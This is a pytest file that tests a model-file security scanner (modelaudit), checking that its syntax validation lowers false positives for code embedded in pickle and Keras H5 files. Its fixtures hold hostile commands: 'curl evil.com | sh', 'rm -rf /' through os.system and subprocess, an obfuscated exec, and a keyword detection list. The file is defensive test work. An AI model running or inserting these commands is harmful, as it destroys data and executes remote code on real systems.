"""Test cases demonstrating py_compile improvements reduce false positives."""

import json
import pickle

import pytest

# Skip if h5py is not available before importing it
pytest.importorskip("h5py")

import h5py

from modelaudit.scanners.keras_h5_scanner import KerasH5Scanner
from modelaudit.scanners.pickle_scanner import PickleScanner


class TestPyCompileImprovements:
    """Test that py_compile validation reduces false positives."""

    def test_pickle_false_positive_reduction(self, tmp_path):
        """Test that strings containing 'eval(' but not actual code aren't flagged."""
        # Create a pickle with a string that looks suspicious but isn't code
        data = {
            "description": "Use eval() function to compute results",  # Not actual code
            "formula": "eval(x + 2) where x is input",  # Also not code
            "actual_code": "import os; os.system('ls')",  # This IS dangerous code
        }

        pickle_path = tmp_path / "test.pkl"
        with open(pickle_path, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(pickle_path))

        # Should only flag the actual dangerous code, not the false positives
        dangerous_issues = [i for i in result.issues if "executable code" in i.message]
        assert len(dangerous_issues) == 1
        assert "validated as executable code" in dangerous_issues[0].message

    def test_pickle_base64_validation(self, tmp_path):
        """Test that base64 strings are checked for Python code."""
        # Create Python code and encode it
        dangerous_code = "import subprocess; subprocess.call(['rm', '-rf', '/'])"
        encoded_dangerous = dangerous_code.encode().hex()

        # Create benign base64 that isn't code
        benign_data = "This is just regular text data, not code at all!"
        encoded_benign = benign_data.encode().hex()

        data = {
            "dangerous": encoded_dangerous,
            "safe": encoded_benign,
        }

        pickle_path = tmp_path / "encoded.pkl"
        with open(pickle_path, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(pickle_path))

        # Should detect the encoded Python code but not the benign data
        encoded_issues = [i for i in result.issues if "Encoded Python code" in i.message]
        assert len(encoded_issues) >= 1
        assert "subprocess" in str(encoded_issues[0].details)

    def test_keras_lambda_layer_validation(self, tmp_path):
        """Test Lambda layer code validation in Keras models."""
        h5_path = tmp_path / "lambda_test.h5"

        with h5py.File(h5_path, "w") as f:
            # Model with actual dangerous Lambda code
            dangerous_model = {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "config": {
                                "function": "lambda x: __import__('os').system('rm -rf /')",
                            },
                        },
                    ],
                },
            }
            f.attrs["model_config"] = json.dumps(dangerous_model)

        scanner = KerasH5Scanner()
        result = scanner.scan(str(h5_path))

        # Should detect dangerous Lambda code
        lambda_issues = [i for i in result.issues if "Lambda" in i.message and "dangerous" in i.message]
        assert len(lambda_issues) == 1
        assert "Dynamic code execution" in lambda_issues[0].details.get("code_analysis", "")

    def test_keras_lambda_false_positive_reduction(self, tmp_path):
        """Test that Lambda layers with non-code strings aren't flagged as dangerous."""
        h5_path = tmp_path / "lambda_safe.h5"

        with h5py.File(h5_path, "w") as f:
            # Model with Lambda that has a string that's not valid Python
            safe_model = {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "config": {
                                "function": "not valid python code at all!",
                                "module": "keras.layers",
                            },
                        },
                    ],
                },
            }
            f.attrs["model_config"] = json.dumps(safe_model)

        scanner = KerasH5Scanner()
        result = scanner.scan(str(h5_path))

        # Should flag as suspicious but not as dangerous executable code
        lambda_issues = [i for i in result.issues if "Lambda" in i.message]
        assert len(lambda_issues) >= 1  # May have multiple issues for the layer

        # Check that it's not flagged as dangerous executable code
        dangerous_lambda = [i for i in lambda_issues if "dangerous Python code" in i.message]
        assert len(dangerous_lambda) == 0

        # Should have at least one suspicious/warning issue
        suspicious_lambda = [
            i for i in lambda_issues if "suspicious" in i.message.lower() or "configuration" in i.message.lower()
        ]
        assert len(suspicious_lambda) >= 1

    def test_tensorflow_pyfunc_validation(self):
        """Test PyFunc/PyCall validation in TensorFlow models."""
        # Note: This test is simplified since we can't easily create actual TF models in tests
        # But it demonstrates the validation logic
        from modelaudit.utils.code_validation import is_code_potentially_dangerous, validate_python_syntax

        # Test dangerous PyFunc code
        dangerous_func = """
def process_data(x):
    import os
    os.system('curl evil.com | sh')
    return x
"""
        is_valid, _ = validate_python_syntax(dangerous_func)
        assert is_valid

        is_dangerous, risk = is_code_potentially_dangerous(dangerous_func)
        assert is_dangerous
        assert "Dangerous imports: os" in risk
        assert "Subprocess operations: os.system" in risk

        # Test safe PyFunc code
        safe_func = """
def process_data(x):
    return x * 2 + 1
"""
        is_valid, _ = validate_python_syntax(safe_func)
        assert is_valid

        is_dangerous, risk = is_code_potentially_dangerous(safe_func)
        assert not is_dangerous
        assert "No dangerous constructs" in risk


class TestFalsePositiveMetrics:
    """Measure false positive reduction with py_compile validation."""

    def test_measure_false_positive_reduction(self, tmp_path):
        """Quantify how py_compile reduces false positives."""
        # Test cases that would be false positives without validation
        false_positive_cases = [
            # Documentation mentioning dangerous functions
            {"doc": "Use eval() to evaluate expressions", "type": "documentation"},
            # Variable names containing keywords
            {"eval_result": 42, "exec_time": 100, "type": "variable_names"},
            # Strings that look like code but aren't valid Python
            {"formula": "eval(2+2) = 4", "type": "math_notation"},
            # Comments about dangerous operations
            {"comment": "# TODO: use os.system() here", "type": "comment"},
            # URLs or paths containing keywords
            {"url": "https://example.com/eval/docs", "type": "url"},
        ]

        # Actual dangerous code that should be detected
        true_positive_cases = [
            {"code": 'eval(\'__import__("os").system("ls")\')', "type": "eval"},
            {"code": "exec(compile('import os', '<string>', 'exec'))", "type": "exec"},
            {"code": "__import__('subprocess').call(['rm', '-rf', '/'])", "type": "import"},
        ]

        # Test without py_compile (old behavior simulation)
        old_false_positives = 0
        old_true_positives = 0

        for case in false_positive_cases:
            # Old scanner would flag anything with eval/exec/os.system
            case_str = str(case)
            if any(pattern in case_str for pattern in ["eval", "exec", "os.system", "__import__"]):
                old_false_positives += 1

        for case in true_positive_cases:
            case_str = str(case)
            if any(pattern in case_str for pattern in ["eval", "exec", "os.system", "__import__"]):
                old_true_positives += 1

        # Test with py_compile validation
        new_false_positives = 0
        new_true_positives = 0

        scanner = PickleScanner()

        for case in false_positive_cases:
            pickle_path = tmp_path / f"fp_{case['type']}.pkl"
            with open(pickle_path, "wb") as f:
                pickle.dump(case, f)

            result = scanner.scan(str(pickle_path))
            # Count only issues that claim to have found executable code
            executable_issues = [i for i in result.issues if "executable code" in i.message]
            if executable_issues:
                new_false_positives += 1

        for case in true_positive_cases:
            pickle_path = tmp_path / f"tp_{case['type']}.pkl"
            with open(pickle_path, "wb") as f:
                pickle.dump(case, f)

            result = scanner.scan(str(pickle_path))
            executable_issues = [
                i for i in result.issues if "executable code" in i.message or "dangerous" in i.message.lower()
            ]
            if executable_issues:
                new_true_positives += 1

        # Calculate metrics
        old_precision = (
            old_true_positives / (old_true_positives + old_false_positives)
            if (old_true_positives + old_false_positives) > 0
            else 0
        )
        new_precision = (
            new_true_positives / (new_true_positives + new_false_positives)
            if (new_true_positives + new_false_positives) > 0
            else 0
        )

        # Assert significant improvement
        assert old_false_positives >= 4  # Old scanner flags most false positive cases
        assert new_false_positives <= 1  # New scanner reduces false positives significantly
        assert new_true_positives >= 2  # Still detects actual threats
        assert new_precision > old_precision  # Overall precision improved

        # Print metrics for PR description
        print("\nFalse Positive Reduction Metrics:")
        print(
            f"Old Scanner: {old_false_positives} false positives, "
            f"{old_true_positives} true positives (precision: {old_precision:.2%})"
        )
        print(
            f"New Scanner: {new_false_positives} false positives, "
            f"{new_true_positives} true positives (precision: {new_precision:.2%})"
        )
        print(f"False positive reduction: {(1 - new_false_positives / max(old_false_positives, 1)):.1%}")


class TestEdgeCases:
    """Test edge cases for py_compile validation."""

    def test_obfuscated_code_detection(self, tmp_path):
        """Test that obfuscated code is still flagged as suspicious."""
        # Create obfuscated but valid Python code
        obfuscated = "exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))"

        data = {"obfuscated": obfuscated}
        pickle_path = tmp_path / "obfuscated.pkl"
        with open(pickle_path, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(pickle_path))

        # Should detect exec usage
        exec_issues = [i for i in result.issues if "exec" in i.message.lower()]
        assert len(exec_issues) > 0

    def test_multiline_code_validation(self, tmp_path):
        """Test validation of multiline Python code."""
        multiline_code = """
import os
import subprocess

def malicious():
    subprocess.call(['curl', 'evil.com'])
    os.system('rm -rf /')

malicious()
"""

        data = {"code": multiline_code}
        pickle_path = tmp_path / "multiline.pkl"
        with open(pickle_path, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(pickle_path))

        # Should detect dangerous patterns in the code
        # The scanner detects subprocess usage in raw content
        all_issues = result.issues
        assert len(all_issues) > 0

        # Check that subprocess was detected either as raw pattern or validated code
        subprocess_detected = any(
            "subprocess" in issue.message.lower()
            or ("details" in dir(issue) and "subprocess" in str(issue.details).lower())
            for issue in all_issues
        )
        assert subprocess_detected
